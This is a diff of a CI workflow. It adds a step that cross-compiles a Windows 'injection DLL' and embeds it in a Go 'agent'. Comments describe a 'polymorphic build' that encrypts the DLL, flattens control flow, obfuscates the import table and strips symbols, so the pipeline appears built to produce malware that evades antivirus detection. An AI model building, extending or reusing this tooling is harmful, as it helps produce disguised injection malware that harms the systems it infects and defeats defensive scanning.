@@ -60,7 +60,27 @@ jobs:
             astor==0.8.1           \
             lief
 
-      # ── 5. Pre-fetch Go module cache (cross-compile) ─────────────────────────
+      # ── 5. Build the Windows injection DLL ───────────────────────────────────
+      - name: Build native injection library
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq mingw-w64
+          cmake -S execution_engine -B execution_engine/build \
+            -DBUILD_SHARED=ON \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DCMAKE_SYSTEM_NAME=Windows \
+            -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc
+          cmake --build execution_engine/build --config Release --target jockey_shared
+
+          DLL=$(find execution_engine/build -type f -name 'libjockey.dll' -print -quit)
+          if [ -z "$DLL" ]; then
+            echo "::error::CMake completed but libjockey.dll was not produced"
+            exit 1
+          fi
+          cp "$DLL" agent/libjockey.dll
+          echo "[+] Prepared $DLL for embedding"
+
+      # ── 6. Pre-fetch Go module cache (cross-compile) ─────────────────────────
       #
       # golang.org/x/sys/windows/registry is a Windows-only import in agent/main.go.
       # We tell Go we're building for Windows so it fetches the right platform files.
@@ -70,10 +90,11 @@ jobs:
           GOOS=windows GOARCH=amd64 go mod download
           echo "[+] Go module cache ready"
 
-      # ── 6. Run the polymorphic build ──────────────────────────────────────────
+      # ── 7. Run the polymorphic build ──────────────────────────────────────────
       #
       # ci_build.py (repo root):
       #   • copies all *.go from agent/ into a tmp dir
+      #   • encrypts the native DLL with the same key injected into the binary
       #   • copies go.mod + go.sum (so golang.org/x/sys resolves)
       #   • applies control-flow flattening + import-table obfuscation to main.go
       #   • compiles with GOOS=windows GOARCH=amd64 -trimpath -s -w
